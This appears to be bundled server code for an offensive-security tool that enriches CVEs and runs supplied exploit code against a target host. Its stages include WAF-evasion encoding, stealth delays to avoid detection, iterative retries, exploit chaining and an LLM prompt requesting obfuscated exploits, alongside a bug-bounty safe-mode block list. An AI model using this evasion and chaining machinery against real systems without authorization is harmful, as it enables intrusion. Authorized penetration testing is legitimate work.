    searchExploitDB(params),
    searchGitHubAdvisories(params),
    params.cveId ? lookupKev(params.cveId) : Promise.resolve({ isKnownExploited: false })
  ]);
  const knownExploits = [...exploitDbResults, ...githubResults];
  const filteredExploits = params.verifiedOnly ? knownExploits.filter((e) => e.verified) : knownExploits;
  const limitedExploits = filteredExploits.slice(0, params.limit || 10);
  const maturityAssessment = assessExploitMaturity(cveDetails, limitedExploits, kevStatus);
  const enrichmentBase = {
    cveDetails,
    knownExploits: limitedExploits,
    kevStatus,
    maturityAssessment
  };
  const llmContext = generateLlmContext(enrichmentBase);
  return {
    ...enrichmentBase,
    llmContext
  };
}
var NVD_API_BASE, GITHUB_ADVISORY_API, CISA_KEV_URL, kevCache, kevCacheTimestamp, KEV_CACHE_TTL;
var init_external_exploit_db = __esm({
  "server/lib/external-exploit-db.ts"() {
    "use strict";
    NVD_API_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0";
    GITHUB_ADVISORY_API = "https://api.github.com/advisories";
    CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json";
    kevCache = null;
    kevCacheTimestamp = 0;
    KEV_CACHE_TTL = 24 * 60 * 60 * 1e3;
  }
});

// server/lib/scanforge-enhanced-pipeline.ts
async function executeEnhancedExploit(request) {
  const startTime = Date.now();
  const stages = [];
  const errors = [];
  let currentCode = request.code;
  const result = {
    finalCode: currentCode,
    stdout: "",
    stderr: "",
    exitCode: -1,
    pipelineStages: stages,
    errors
  };
  console.log(`[EnhancedPipeline] Starting enhanced exploit execution: ${request.exploitId}`);
  console.log(`[EnhancedPipeline] Options: safeMode=${request.bugBountySafeMode}, wafEvasion=${request.enableWafEvasion}, iterative=${request.enableIterative}, stealth=${request.enableStealth}`);
  if (request.enableQualityScoring !== false) {
    const stageStart = Date.now();
    try {
      const exploitInput = {
        code: currentCode,
        language: request.language === "curl" || request.language === "raw_http" ? request.language : request.language,
        vulnClass: request.vulnClass,
        target: `${request.targetHost}${request.targetPort ? ":" + request.targetPort : ""}`,
        isBugBounty: request.bugBountySafeMode,
        safeMode: request.bugBountySafeMode,
        expectedOutcome: request.expectedOutcome
      };
      const qualityScore = scoreExploit(exploitInput);
      result.qualityScore = qualityScore;
      result.qualityReport = generateQualityReport(qualityScore);
      const minScore = request.minQualityScore || 30;
      if (qualityScore.overall < minScore) {
        stages.push({ name: "quality-scoring", status: "failed", durationMs: Date.now() - stageStart, details: `Score ${qualityScore.overall} below minimum ${minScore}` });
        return {
          ...result,
          status: "blocked",
          finalCode: currentCode,
          stdout: "",
          stderr: `Exploit quality score (${qualityScore.overall}) below minimum threshold (${minScore}). ${qualityScore.suggestions.join("; ")}`,
          exitCode: -1,
          durationMs: Date.now() - startTime,
          pipelineStages: stages,
          errors: [{ stage: "quality-scoring", message: `Score ${qualityScore.overall} < ${minScore}`, recoverable: true }]
        };
      }
      if (!qualityScore.executeRecommendation) {
        console.warn(`[EnhancedPipeline] Quality scorer does not recommend execution (score: ${qualityScore.overall}, verdict: ${qualityScore.verdict})`);
      }
      stages.push({ name: "quality-scoring", status: "completed", durationMs: Date.now() - stageStart, details: `Score: ${qualityScore.overall}/100 [${qualityScore.verdict}]` });
    } catch (err) {
      errors.push({ stage: "quality-scoring", message: err.message, recoverable: true });
      stages.push({ name: "quality-scoring", status: "failed", durationMs: Date.now() - stageStart });
    }
  }
  if (request.bugBountySafeMode) {
    const stageStart = Date.now();
    try {
      const safeMode = createSafeMode(request.bugBountyRules || {
        programName: "default",
        scope: { inScope: [request.targetHost], outOfScope: [] },
        maxSeverity: "critical",
        allowedActions: ["read", "enumerate", "exploit_poc"],
        prohibitedActions: ["data_destruction", "service_disruption", "lateral_movement"]
      });
      const safetyCheck = safeMode.checkExploit(currentCode, request.vulnClass || "unknown");
      result.safetyCheck = safetyCheck;
      if (!safetyCheck.safe) {
        stages.push({ name: "bug-bounty-safe-mode", status: "failed", durationMs: Date.now() - stageStart, details: `Blocked: ${safetyCheck.violations.join("; ")}` });
        return {
          ...result,
          status: "blocked",
          finalCode: currentCode,
          stdout: "",
          stderr: `Bug bounty safe mode blocked execution: ${safetyCheck.violations.join("; ")}`,
          exitCode: -1,
          durationMs: Date.now() - startTime,
          pipelineStages: stages,
          errors: [{ stage: "bug-bounty-safe-mode", message: safetyCheck.violations.join("; "), recoverable: false }]
        };
      }
      stages.push({ name: "bug-bounty-safe-mode", status: "completed", durationMs: Date.now() - stageStart, details: "Passed safety checks" });
    } catch (err) {
      errors.push({ stage: "bug-bounty-safe-mode", message: err.message, recoverable: true });
      stages.push({ name: "bug-bounty-safe-mode", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "bug-bounty-safe-mode", status: "skipped", durationMs: 0 });
  }
  if (request.enableExternalEnrichment && request.cveId) {
    const stageStart = Date.now();
    try {
      const enrichment = await enrichVulnerability({ cveId: request.cveId, vulnType: request.vulnClass });
      result.enrichment = enrichment;
      stages.push({ name: "external-enrichment", status: "completed", durationMs: Date.now() - stageStart, details: `Maturity: ${enrichment.maturityAssessment.level}, KEV: ${enrichment.kevStatus?.isKnownExploited || false}` });
    } catch (err) {
      errors.push({ stage: "external-enrichment", message: err.message, recoverable: true });
      stages.push({ name: "external-enrichment", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "external-enrichment", status: "skipped", durationMs: 0 });
  }
  if (request.vulnClass) {
    const stageStart = Date.now();
    try {
      const templateContext = generateTemplateContext(request.vulnClass, "exploitation");
      result.templateContext = templateContext;
      stages.push({ name: "vuln-template-context", status: "completed", durationMs: Date.now() - stageStart, details: `Template loaded for ${request.vulnClass}` });
    } catch (err) {
      errors.push({ stage: "vuln-template-context", message: err.message, recoverable: true });
      stages.push({ name: "vuln-template-context", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "vuln-template-context", status: "skipped", durationMs: 0 });
  }
  {
    const stageStart = Date.now();
    try {
      const lang = request.language === "python" || request.language === "bash" ? request.language : "bash";
      const manifest = buildManifest(
        request.exploitId,
        currentCode,
        lang,
        request.vulnClass
      );
      const depCheck = await checkDependencies(manifest);
      if (!depCheck.ready) {
        const missing = [...depCheck.missingRequired, ...depCheck.missingOptional];
        console.log(`[EnhancedPipeline] Resolving ${missing.length} missing dependencies`);
        await resolveDependencies(missing, request.language);
      }
      stages.push({ name: "dependency-resolution", status: "completed", durationMs: Date.now() - stageStart, details: depCheck.ready ? "All deps satisfied" : `Resolved ${depCheck.missingRequired.length} required + ${depCheck.missingOptional.length} optional deps` });
    } catch (err) {
      errors.push({ stage: "dependency-resolution", message: err.message, recoverable: true });
      stages.push({ name: "dependency-resolution", status: "failed", durationMs: Date.now() - stageStart });
    }
  }
  if (request.enableWafEvasion && request.detectedWaf) {
    const stageStart = Date.now();
    try {
      const evasionStrategy = selectEvasionStrategy(request.detectedWaf, request.vulnClass || "generic");
      result.evasionApplied = evasionStrategy;
      const encoded = applyWafEvasion(currentCode, evasionStrategy);
      if (encoded.success) {
        currentCode = encoded.encodedPayload;
        result.encodingResult = encoded;
      }
      stages.push({ name: "waf-evasion", status: "completed", durationMs: Date.now() - stageStart, details: `Strategy: ${evasionStrategy.name}, WAF: ${request.detectedWaf}` });
    } catch (err) {
      errors.push({ stage: "waf-evasion", message: err.message, recoverable: true });
      stages.push({ name: "waf-evasion", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "waf-evasion", status: "skipped", durationMs: 0 });
  }
  if (request.enableStealth) {
    const stageStart = Date.now();
    try {
      const stealthController = createStealthController(request.stealthConfig || {});
      const decision = stealthController.evaluate(request.targetHost, request.vulnClass || "generic");
      result.stealthDecision = decision;
      if (decision.shouldDelay && decision.delayMs > 0) {
        console.log(`[EnhancedPipeline] Stealth delay: ${decision.delayMs}ms`);
        await new Promise((resolve) => setTimeout(resolve, decision.delayMs));
      }
      stages.push({ name: "stealth-controls", status: "completed", durationMs: Date.now() - stageStart, details: `Delay: ${decision.delayMs}ms, Risk: ${decision.detectionRisk}` });
    } catch (err) {
      errors.push({ stage: "stealth-controls", message: err.message, recoverable: true });
      stages.push({ name: "stealth-controls", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "stealth-controls", status: "skipped", durationMs: 0 });
  }
  result.finalCode = currentCode;
  const executionStart = Date.now();
  try {
    if (request.enableIterative && request.maxIterations && request.maxIterations > 1) {
      const iterativeConfig = {
        maxIterations: request.maxIterations,
        adaptOnFailure: true,
        vulnClass: request.vulnClass,
        targetHost: request.targetHost,
        targetPort: request.targetPort
      };
      const loop = createIterativeLoop(iterativeConfig);
      const iterResult = await loop.execute(currentCode, request.language, request.engagementId, request.exploitId, request.timeoutSeconds);
      result.iterations = iterResult.iterations;
      result.stdout = iterResult.finalResult?.stdout || "";
      result.stderr = iterResult.finalResult?.stderr || "";
      result.exitCode = iterResult.finalResult?.exitCode ?? -1;
      if (iterResult.succeeded) {
        currentCode = iterResult.successfulCode || currentCode;
      }
      stages.push({ name: "iterative-execution", status: iterResult.succeeded ? "completed" : "failed", durationMs: Date.now() - executionStart, details: `${iterResult.iterations.length} iterations, success: ${iterResult.succeeded}` });
    } else {
      const { executeExploit } = await import("./exploit-sandbox-JZT2ZXBA.js");
      const execResult = await executeExploit(request.engagementId, {
        exploitId: request.exploitId,
        code: currentCode,
        language: request.language === "curl" || request.language === "raw_http" ? "bash" : request.language,
        targetHost: request.targetHost,
        targetPort: request.targetPort,
        timeoutSeconds: request.timeoutSeconds || 60,
        dryRun: request.dryRun || false,
        vulnerabilityCve: request.cveId,
        exploitModule: request.exploitId
      });
      result.stdout = execResult.stdout;
      result.stderr = execResult.stderr;
      result.exitCode = execResult.exitCode;
      stages.push({ name: "single-execution", status: execResult.status === "success" ? "completed" : "failed", durationMs: Date.now() - executionStart, details: `Exit: ${execResult.exitCode}, Status: ${execResult.status}` });
    }
  } catch (err) {
    result.stdout = "";
    result.stderr = err.message;
    result.exitCode = -1;
    errors.push({ stage: "execution", message: err.message, recoverable: false });
    stages.push({ name: "execution", status: "failed", durationMs: Date.now() - executionStart });
  }
  {
    const stageStart = Date.now();
    try {
      const verification = await verifyExploitSuccess({
        exploitCode: currentCode,
        stdout: result.stdout || "",
        stderr: result.stderr || "",
        exitCode: result.exitCode || -1,
        vulnClass: request.vulnClass,
        targetHost: request.targetHost,
        targetPort: request.targetPort,
        expectedOutcome: request.expectedOutcome
      });
      result.verification = verification;
      stages.push({ name: "success-verification", status: "completed", durationMs: Date.now() - stageStart, details: `Verified: ${verification.verified}, Confidence: ${verification.confidence}%` });
    } catch (err) {
      errors.push({ stage: "success-verification", message: err.message, recoverable: true });
      stages.push({ name: "success-verification", status: "failed", durationMs: Date.now() - stageStart });
    }
  }
  if (request.enableChaining && result.exitCode === 0) {
    const stageStart = Date.now();
    try {
      const chainPlan = await planExploitChain({
        currentVuln: request.vulnClass || "unknown",
        currentAccess: result.verification?.achievedAccess || "none",
        targetHost: request.targetHost,
        targetPort: request.targetPort,
        exploitOutput: result.stdout || "",
        engagementId: request.engagementId
      });
      result.chainPlan = chainPlan;
      stages.push({ name: "chain-planning", status: "completed", durationMs: Date.now() - stageStart, details: `${chainPlan.steps.length} chain steps planned` });
    } catch (err) {
      errors.push({ stage: "chain-planning", message: err.message, recoverable: true });
      stages.push({ name: "chain-planning", status: "failed", durationMs: Date.now() - stageStart });
    }
  } else {
    stages.push({ name: "chain-planning", status: "skipped", durationMs: 0 });
  }
  let status;
  if (result.exitCode === 0 && result.verification?.verified) {
    status = "success";
  } else if (result.exitCode === 0) {
    status = "partial";
  } else if (errors.some((e) => !e.recoverable)) {
    status = "failed";
  } else {
    status = "failed";
  }
  const totalDuration = Date.now() - startTime;
  console.log(`[EnhancedPipeline] Completed: status=${status}, duration=${totalDuration}ms, stages=${stages.length}, errors=${errors.length}`);
  return {
    ...result,
    status,
    finalCode: currentCode,
    stdout: result.stdout || "",
    stderr: result.stderr || "",
    exitCode: result.exitCode ?? -1,
    durationMs: totalDuration,
    pipelineStages: stages,
    errors
  };
}
async function generateEnrichedExploitPrompt(params) {
  const sections = [];
  const templateContext = generateTemplateContext(params.vulnClass, "all");
  if (templateContext) {
    sections.push(templateContext);
  }
  if (params.cveId) {
    try {
      const enrichment = await enrichVulnerability({ cveId: params.cveId });
      sections.push(enrichment.llmContext);
    } catch {
    }
  }
  if (params.detectedWaf) {
    const template = getTemplate(params.vulnClass);
    if (template) {
      sections.push(`
=== WAF Evasion Notes (${params.detectedWaf}) ===`);
      sections.push(template.exploitation.wafBypassNotes.join("\n"));
    }
  }
  if (params.isBugBounty) {
    sections.push("\n=== Bug Bounty Constraints ===");
    sections.push("- DO NOT use destructive payloads");
    sections.push("- DO NOT attempt lateral movement");
    sections.push("- DO NOT exfiltrate real user data");
    sections.push("- Minimize impact to target systems");
    sections.push("- Focus on proof-of-concept demonstration");
    sections.push("- Include cleanup/restoration steps");
  }
  sections.push("\n=== Exploit Quality Requirements ===");
  sections.push("- Include error handling and conditional logic");
  sections.push("- Capture output for evidence (save to files, print results)");
  sections.push("- Include timestamps and logging");
  sections.push("- Use encoding/obfuscation for stealth");
  sections.push("- Add verification steps to confirm success");
  sections.push("- Include cleanup/restoration where appropriate");
  return sections.join("\n\n");
}
function preflightCheck(request) {
  const reasons = [];
  const qv = quickValidate({
    code: request.code,
    language: request.language,
    vulnClass: request.vulnClass,
    isBugBounty: request.bugBountySafeMode,
    safeMode: request.bugBountySafeMode
  });
  if (!qv.pass) {
    reasons.push(qv.reason || "Quality validation failed");
  }
  if (request.code.trim().length < 10) {
    reasons.push("Exploit code too short");
  }
  if (!request.targetHost) {
    reasons.push("No target host specified");
  }
  return {
    pass: reasons.length === 0,
    reasons
  };
}
var init_scanforge_enhanced_pipeline = __esm({
  "server/lib/scanforge-enhanced-pipeline.ts"() {
    init_exploit_quality_scorer();
    init_exploit_verification_engine();
    init_payload_encoding_engine();
    init_iterative_exploit_loop();
    init_exploit_chain_planner();
    init_bug_bounty_safe_mode();
    init_exploit_dependency_manager();
    init_stealth_controls();
    init_vuln_class_templates();
    init_external_exploit_db();
  }
});
init_scanforge_enhanced_pipeline();
export {
  executeEnhancedExploit,
  generateEnrichedExploitPrompt,
  preflightCheck
};
